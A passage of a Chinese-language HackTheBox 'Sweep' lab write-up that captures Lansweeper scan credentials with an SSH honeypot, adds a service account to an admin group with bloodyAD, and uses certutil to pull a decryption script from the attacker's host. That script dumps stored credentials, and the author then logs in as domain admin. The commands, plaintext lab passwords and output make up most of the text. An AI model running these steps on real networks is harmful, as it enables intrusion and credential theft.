+<p>并且在扫描凭据这里，将凭据映射绑定到ip范围的linux主机上，这样它就会利用保存凭证进行ssh登陆我们的蜜罐</p>
+<p><img src="/sweep/image-5.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>回到扫描目标开始扫描并返回蜜罐等待</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker?kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ./sshesame-linux-amd64 --config server.conf 
+</span></span><span style="display:flex;"><span>INFO 2025/08/27 10:23:01 No host keys configured, using keys at <span style="color:#e6db74">&#34;/home/wackymaker/.local/share/sshesame&#34;</span>
+</span></span><span style="display:flex;"><span>INFO 2025/08/27 10:23:01 Host key <span style="color:#e6db74">&#34;/home/wackymaker/.local/share/sshesame/host_rsa_key&#34;</span> not found, generating it
+</span></span><span style="display:flex;"><span>INFO 2025/08/27 10:23:01 Host key <span style="color:#e6db74">&#34;/home/wackymaker/.local/share/sshesame/host_ecdsa_key&#34;</span> not found, generating it
+</span></span><span style="display:flex;"><span>INFO 2025/08/27 10:23:01 Host key <span style="color:#e6db74">&#34;/home/wackymaker/.local/share/sshesame/host_ed25519_key&#34;</span> not found, generating it
+</span></span><span style="display:flex;"><span>INFO 2025/08/27 10:23:01 Listening on 10.10.16.22:2222
+</span></span><span style="display:flex;"><span>WARNING 2025/08/27 10:33:50 Failed to accept connection: Failed to establish SSH server connection: EOF
+</span></span><span style="display:flex;"><span>WARNING 2025/08/27 10:34:00 Failed to accept connection: Failed to establish SSH server connection: ssh: disconnect, reason 11: Session closed
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:01 <span style="color:#f92672">[</span>10.129.203.20:61012<span style="color:#f92672">]</span> authentication <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#34;svc_inventory_lnx&#34;</span> without credentials rejected
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:01 <span style="color:#f92672">[</span>10.129.203.20:61012<span style="color:#f92672">]</span> authentication <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#34;svc_inventory_lnx&#34;</span> with password <span style="color:#e6db74">&#34;0|5m-U6?/uAX&#34;</span> accepted
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:01 <span style="color:#f92672">[</span>10.129.203.20:61012<span style="color:#f92672">]</span> connection with client version <span style="color:#e6db74">&#34;SSH-2.0-RebexSSH_5.0.8372.0&#34;</span> established
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:02 <span style="color:#f92672">[</span>10.129.203.20:61012<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>channel 0<span style="color:#f92672">]</span> session requested
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:02 <span style="color:#f92672">[</span>10.129.203.20:61012<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>channel 0<span style="color:#f92672">]</span> command <span style="color:#e6db74">&#34;uname&#34;</span> requested
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:02 <span style="color:#f92672">[</span>10.129.203.20:61012<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>channel 0<span style="color:#f92672">]</span> closed
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:02 <span style="color:#f92672">[</span>10.129.203.20:61012<span style="color:#f92672">]</span> connection closed
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:03 <span style="color:#f92672">[</span>10.129.203.20:61014<span style="color:#f92672">]</span> authentication <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#34;svc_inventory_lnx&#34;</span> without credentials rejected
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:04 <span style="color:#f92672">[</span>10.129.203.20:61014<span style="color:#f92672">]</span> authentication <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#34;svc_inventory_lnx&#34;</span> with password <span style="color:#e6db74">&#34;0|5m-U6?/uAX&#34;</span> accepted
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:04 <span style="color:#f92672">[</span>10.129.203.20:61014<span style="color:#f92672">]</span> connection with client version <span style="color:#e6db74">&#34;SSH-2.0-RebexSSH_5.0.8372.0&#34;</span> established
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:04 <span style="color:#f92672">[</span>10.129.203.20:61014<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>channel 0<span style="color:#f92672">]</span> session requested
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:04 <span style="color:#f92672">[</span>10.129.203.20:61014<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>channel 0<span style="color:#f92672">]</span> PTY using terminal <span style="color:#e6db74">&#34;xterm&#34;</span> <span style="color:#f92672">(</span>size 80x25<span style="color:#f92672">)</span> requested
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:05 <span style="color:#f92672">[</span>10.129.203.20:61014<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>channel 0<span style="color:#f92672">]</span> shell requested
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:05 <span style="color:#f92672">[</span>10.129.203.20:61014<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>channel 0<span style="color:#f92672">]</span> input: <span style="color:#e6db74">&#34;smclp&#34;</span>
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:05 <span style="color:#f92672">[</span>10.129.203.20:61014<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>channel 0<span style="color:#f92672">]</span> input: <span style="color:#e6db74">&#34;show system1&#34;</span>
+</span></span><span style="display:flex;"><span>WARNING 2025/08/27 10:34:15 Error sending CRLF: EOF
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:15 <span style="color:#f92672">[</span>10.129.203.20:61014<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>channel 0<span style="color:#f92672">]</span> closed
+</span></span><span style="display:flex;"><span>2025/08/27 10:34:15 <span style="color:#f92672">[</span>10.129.203.20:61014<span style="color:#f92672">]</span> connection closed
+</span></span></code></pre></div><p>成功劫持用户凭证</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo user1<span style="color:#f92672">=</span>svc_inventory_lnx&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo pass1<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0|5m-U6?/uAX&#39;</span>&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ vim start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ . start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo $pass1
+</span></span><span style="display:flex;"><span>0|5m-U6?/uAX
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u $user1 -p $pass1
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:INVENTORY<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:sweep.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sweep.vl<span style="color:#ae81ff">\s</span>vc_inventory_lnx:0|5m-U6?/uAX 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc winrm $ip -u $user1 -p $pass1
+</span></span><span style="display:flex;"><span>WINRM       10.129.203.20   <span style="color:#ae81ff">5985</span>   INVENTORY        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:INVENTORY<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:sweep.vl<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>WINRM       10.129.203.20   <span style="color:#ae81ff">5985</span>   INVENTORY        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> sweep.vl<span style="color:#ae81ff">\s</span>vc_inventory_lnx:0|5m-U6?/uAX
+</span></span></code></pre></div><p>存在权限但是没有winrm，回头这个用户的猎犬</p>
+<p><img src="/sweep/image-6.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>有出站，可以将自己添加入LANSWEEPER ADMINS组，并且LANSWEEPER ADMINS组属于远程管理组</p>
+<p><img src="/sweep/image-7.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>远程加入组成功</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ bloodyAD --host <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span> -d <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">&#34;</span> -u $user1 -p $pass1 add groupMember <span style="color:#e6db74">&#34;LANSWEEPER ADMINS&#34;</span> <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> svc_inventory_lnx added to LANSWEEPER ADMINS
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc winrm $ip -u $user1 -p $pass1
+</span></span><span style="display:flex;"><span>WINRM       10.129.203.20   <span style="color:#ae81ff">5985</span>   INVENTORY        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:INVENTORY<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:sweep.vl<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>WINRM       10.129.203.20   <span style="color:#ae81ff">5985</span>   INVENTORY        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sweep.vl<span style="color:#ae81ff">\s</span>vc_inventory_lnx:0|5m-U6?/uAX <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>登陆获取user.txt</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i $ip -u $user1 -p $pass1
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint 
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_inventory_lnx<span style="color:#ae81ff">\D</span>ocuments&gt; cd ../../../
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\&gt;</span> dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                 -------------         ------ ----
+</span></span><span style="display:flex;"><span>d-----         7/31/2025   4:06 AM                inetpub
+</span></span><span style="display:flex;"><span>d-----          5/8/2021   1:20 AM                PerfLogs
+</span></span><span style="display:flex;"><span>d-r---         7/28/2025   4:38 PM                Program Files
+</span></span><span style="display:flex;"><span>d-----          2/8/2024  12:17 PM                Program Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>d-r---         8/27/2025   7:43 AM                Users
+</span></span><span style="display:flex;"><span>d-----         7/31/2025   4:11 AM                Windows
+</span></span><span style="display:flex;"><span>-a----          8/5/2025   5:45 AM             <span style="color:#ae81ff">33</span> user.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\&gt;</span> type user.txt
+</span></span><span style="display:flex;"><span>d2d89a8******************165
+</span></span></code></pre></div><h2 id="提权">提权
+</h2><p>钻了一会兔子洞，dpapi没有信息，winpeas扫到了Lansweeper的凭证信息位于</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\&gt;</span> cd <span style="color:#e6db74">&#39;C:\Program Files (x86)\Lansweeper\Key&#39;</span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\L</span>answeeper<span style="color:#ae81ff">\K</span>ey&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\L</span>answeeper<span style="color:#ae81ff">\K</span>ey
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                 -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----          2/8/2024  11:48 AM           <span style="color:#ae81ff">1024</span> Encryption.txt
+</span></span></code></pre></div><p>但是它是加密的，我们可以简单枚举一下就找到能利用的工具</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://github.com/Yeeb1/SharpLansweeperDecrypt
+</span></span></code></pre></div><p>环境应该存在一定的防护，但是我懒得检测，evil的上传失效，所以起py传上去</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\t</span>asks&gt; certutil -urlcache -split -f http://10.10.16.22/LansweeperDecrypt.ps1 C:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\t</span>asks<span style="color:#ae81ff">\L</span>answeeperDecrypt.ps1
+</span></span><span style="display:flex;"><span>****  Online  ****
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0000</span>  ...
+</span></span><span style="display:flex;"><span>  10b3
+</span></span><span style="display:flex;"><span>CertUtil: -URLCache command completed successfully
+</span></span></code></pre></div><p>powershell运行后会自动解密凭证库</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\t</span>asks&gt; powershell .<span style="color:#ae81ff">\L</span>answeeperDecrypt.ps1
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Loading web.config file...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found protected connectionStrings section. Decrypting...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Decrypted connectionStrings section:
+</span></span><span style="display:flex;"><span>&lt;connectionStrings&gt;
+</span></span><span style="display:flex;"><span>    &lt;add name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;lansweeper&#34;</span> connectionString<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Data Source=(localdb)\.\LSInstance;Initial Catalog=lansweeperdb;Integrated Security=False;User ID=lansweeperuser;Password=Uk2)Dw3!Wf1)Hh;Connect Timeout=10;Application Name=&amp;quot;LsService Core .Net SqlClient Data Provider&amp;quot;&#34;</span> providerName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;System.Data.SqlClient&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>&lt;/connectionStrings&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to the database...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving credentials from the database...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Decrypting password <span style="color:#66d9ef">for</span> user: SNMP Community String
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Decrypting password <span style="color:#66d9ef">for</span> user:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Decrypting password <span style="color:#66d9ef">for</span> user: SWEEP<span style="color:#ae81ff">\s</span>vc_inventory_win
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Decrypting password <span style="color:#66d9ef">for</span> user: svc_inventory_lnx
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Credentials retrieved and decrypted successfully:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CredName          Username                Password
+</span></span><span style="display:flex;"><span>--------          --------                --------
+</span></span><span style="display:flex;"><span>SNMP-Private      SNMP Community String   private
+</span></span><span style="display:flex;"><span>Global SNMP                               public
+</span></span><span style="display:flex;"><span>Inventory Windows SWEEP<span style="color:#ae81ff">\s</span>vc_inventory_win 4^56!sK&amp;<span style="color:#f92672">}</span>eA?
+</span></span><span style="display:flex;"><span>Inventory Linux   svc_inventory_lnx       0|5m-U6?/uAX
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Database connection closed.
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\t</span>asks&gt; 
+</span></span></code></pre></div><p>还记得吗，这个win是域管，所以直接登陆获得root</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo user2<span style="color:#f92672">=</span>svc_inventory_win&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo pass2<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;4^56!sK&amp;}eA?&#39;</span>&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ vim start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ . start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo $pass2
+</span></span><span style="display:flex;"><span>4^56!sK&amp;<span style="color:#f92672">}</span>eA?
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i $ip -u $user2 -p $pass2
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#e6db74">&#39; for module Reline 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                        
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                        
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Info: Establishing connection to remote endpoint 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*Evil-WinRM* PS C:\Users\svc_inventory_win\Documents&gt; cd ../desk*
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*Evil-WinRM* PS C:\Users\svc_inventory_win\Desktop&gt; type root.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Cannot find path &#39;</span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_inventory_win<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\r</span>oot.txt<span style="color:#960050;background-color:#1e0010">&#39;</span> because it does not exist.
+</span></span><span style="display:flex;"><span>At line:1 char:1
+</span></span><span style="display:flex;"><span>+ type root.txt
+</span></span><span style="display:flex;"><span>+ ~~~~~~~~~~~~~
+</span></span><span style="display:flex;"><span>    + CategoryInfo          : ObjectNotFound: <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_in...esktop<span style="color:#ae81ff">\r</span>oot.txt:String<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Get-Content<span style="color:#f92672">]</span>, ItemNotFoundException
+</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_inventory_win<span style="color:#ae81ff">\D</span>esktop&gt; cd ../../administrator/des*
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\a</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; type root.txt
+</span></span><span style="display:flex;"><span>71770ae*****************77cc65
+</span></span></code></pre></div><p>不算难的机器，但是有少许兔子洞，挺好玩的</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a>
+        
+            <a href="/tags/htb/">Htb</a>
+        
+            <a href="/tags/%E5%9F%9F%E4%B9%8B%E9%AD%94%E6%B3%95/">域之魔法</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/bicher-%E8%87%AA%E5%BB%BA/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">bicker-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/80211/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">802.11帧介绍</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/optinseltrace4/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">OpTinselTrace4-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/dnsadmin/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">基于DnsAdmin组的dns热重载权限维持及衍生情况</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">使用普通用户帐户远程利用RBCD</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 wackymaker
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
